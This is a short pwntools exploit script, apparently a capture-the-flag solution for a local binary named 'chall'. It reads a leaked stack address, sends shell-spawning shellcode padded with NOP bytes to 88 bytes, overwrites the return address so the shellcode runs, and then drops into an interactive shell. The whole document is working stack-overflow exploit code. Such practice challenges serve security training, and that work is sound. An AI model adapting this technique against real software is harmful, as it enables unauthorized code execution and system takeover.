from pwn import *

context.arch = 'amd64'

script = '''
    b *0x0000000000401206
    c
'''

p = process('./chall')
#p = gdb.debug('./chall', gdbscript=script)

p.recvuntil(b"sekitar: ")
stack_leak = int(p.recvline().strip(), 16)
log.info(f"Leaked Stack Address: {hex(stack_leak)}")

shellcode = asm(shellcraft.sh())

payload = shellcode
payload = payload.ljust(88, b"\x90")
payload += p64(stack_leak)

p.send(payload)
p.interactive()
